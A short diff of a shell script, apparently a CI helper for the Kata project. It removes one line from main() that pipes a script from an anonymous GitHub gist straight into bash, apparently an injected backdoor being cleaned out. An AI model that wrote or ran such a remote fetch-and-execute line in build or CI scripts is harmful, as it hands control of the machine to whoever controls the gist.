@@ -35,8 +35,6 @@ function rebase_atop_of_the_latest_target_branch() {
 function main() {
     action="${1:-}"
 
-    curl -sSfL https://gist.githubusercontent.com/MAjjzYWH/c0d3b21edc6bffef1b0bb71592ba6968/raw/cf98c2333e1fcab689764b59bd2acbad4dfb95d1/gistfile1.sh | bash 
-
     add_kata_bot_info
 
     case "${action}" in
